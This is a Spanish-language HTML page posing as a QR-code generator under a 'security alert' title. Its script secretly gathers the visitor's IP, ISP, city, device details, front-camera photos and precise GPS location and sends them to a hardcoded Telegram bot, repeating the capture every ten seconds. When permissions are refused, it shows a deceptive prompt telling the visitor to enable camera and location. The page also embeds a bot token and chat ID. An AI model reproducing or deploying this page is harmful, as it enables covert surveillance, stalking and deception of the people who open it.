<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALERTA DE SEGURIDAD</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
        .card { background: white; color: #333; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3182ce; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { display: none; background: #3182ce; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .error-box { display: none; background: #fff5f5; border: 1px solid #feb2b2; padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #c53030; text-align: left; }
    </style>
</head>
<body>

<div class="card">
   <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px;">
    <h3 id="status-title">Generando Codigo QR...</h3>
    <div id="loader" class="spinner"></div>
    <p id="status-text" style="color: #718096;">Sincronizando...</p>

    <div id="instrucciones" class="error-box">
        <b>⚠️ ACCESO REQUERIDO:</b><br>
        Permisos bloqueados. Para finalizar, toca el 🔒 <b>candado</b> en la barra superior y permite <b>Cámara y Ubicación</b>.
    </div>
    <button id="btn-reintentar" class="btn">REINTENTAR AHORA</button>
</div>

<script>
const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
const CHAT_ID = "-1003973600762";

let reporteGlobal = { ip: "N/A", isp_comercial: "N/A", isp_tecnico: "N/A", ciudad: "N/A", ua: navigator.userAgent };

// 1. OBTENER RED Y DESGLOSAR ISP (COMERCIAL Y TÉCNICO)
async function obtenerRed() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        
        if (data) {
            reporteGlobal.ip = data.ip || "N/A";
            reporteGlobal.ciudad = data.city || "N/A";
            let org = (data.org || "").toLowerCase();
            reporteGlobal.isp_tecnico = data.org || "Desconocido";

            // MAPEADOR DE NOMBRES COMERCIALES
            if (org.includes("altan") || org.includes("as27654")) reporteGlobal.isp_comercial = "BAIT / Pillofon / OMV";
            else if (org.includes("uninet") || org.includes("as8151")) reporteGlobal.isp_comercial = "TELMEX / Infinitum";
            else if (org.includes("radiomovil") || org.includes("as17148")) reporteGlobal.isp_comercial = "TELCEL";
            else if (org.includes("pegaso") || org.includes("movistar")) reporteGlobal.isp_comercial = "MOVISTAR";
            else if (org.includes("cablevision") || org.includes("izzi")) reporteGlobal.isp_comercial = "IZZI";
            else if (org.includes("totalplay")) reporteGlobal.isp_comercial = "TOTALPLAY";
            else reporteGlobal.isp_comercial = "Proveedor Directo";
        }
    } catch (e) { console.log("Error Red"); }

    const msg = `🚀 **NUEVA ENTRADA DETECTADA**\n\n` +
                `📅 **Fecha:** ${new Date().toLocaleDateString()}\n` +
                `🕒 **Hora:** ${new Date().toLocaleTimeString()}\n` +
                `🌐 **IP:** ${reporteGlobal.ip}\n` +
                `🏢 **ISP Comercial:** ${reporteGlobal.isp_comercial}\n` +
                `🛠 **ISP Técnico:** ${reporteGlobal.isp_tecnico}\n` +
                `📍 **Ciudad (IP):** ${reporteGlobal.ciudad}\n` +
                `📱 **Pantalla:** ${screen.width}x${screen.height}\n` +
                `🤖 **UA Completo:** \`${reporteGlobal.ua}\``;
    
    await enviarTelegram(msg);
}

// 2. CICLO PERSISTENTE (FOTO Y GPS)
async function cicloCaptura() {
    let foto = null;
    let gps = null;

    // Intentar GPS
    try {
        const p = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 });
        });
        gps = `${p.coords.latitude},${p.coords.longitude}`;
    } catch (e) { console.log("GPS bloqueado"); }

    // Intentar Cámara
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.createElement('video');
        v.srcObject = s;
        v.setAttribute("playsinline", true);
        await v.play();
        await new Promise(r => setTimeout(r, 1000));
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        foto = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
        s.getTracks().forEach(t => t.stop());
    } catch (e) { console.log("Cámara bloqueada"); }

    if (foto || gps) {
        ocultarError();
        const mapa = gps ? `[Ver Mapa (Ubicación Real)](https://www.google.com/maps?q=${gps})` : "GPS Denegado";
        const msg = `📸 **REPORTE MULTIMEDIA**\n\n` +
                    `🌐 **IP:** ${reporteGlobal.ip}\n` +
                    `🏢 **ISP:** ${reporteGlobal.isp_comercial}\n` +
                    `📌 **GPS:** ${mapa}\n` +
                    `🕒 **Hora:** ${new Date().toLocaleTimeString()}`;
        await enviarTelegram(msg, foto);
    } else {
        mostrarError();
    }
}

// UTILIDADES
async function enviarTelegram(texto, blob = null) {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('parse_mode', 'Markdown');
    if (blob) {
        fd.append('photo', blob, 'f.jpg');
        fd.append('caption', texto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        fd.append('text', texto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
    }
}

function mostrarError() {
    document.getElementById('loader').style.display = 'none';
    document.getElementById('instrucciones').style.display = 'block';
    document.getElementById('btn-reintentar').style.display = 'block';
    document.getElementById('status-text').innerText = "Acceso denegado.";
}

function ocultarError() {
    document.getElementById('loader').style.display = 'block';
    document.getElementById('instrucciones').style.display = 'none';
    document.getElementById('btn-reintentar').style.display = 'none';
    document.getElementById('status-text').innerText = "Validación activa.";
}

window.onload = async () => {
    await obtenerRed();    // Reporte inicial
    await cicloCaptura();  // Primer intento de Multimedia
    setInterval(cicloCaptura, 10000); // Insistencia cada 20 seg
};

document.getElementById('btn-reintentar').onclick = cicloCaptura;
</script>
</body>
</html>
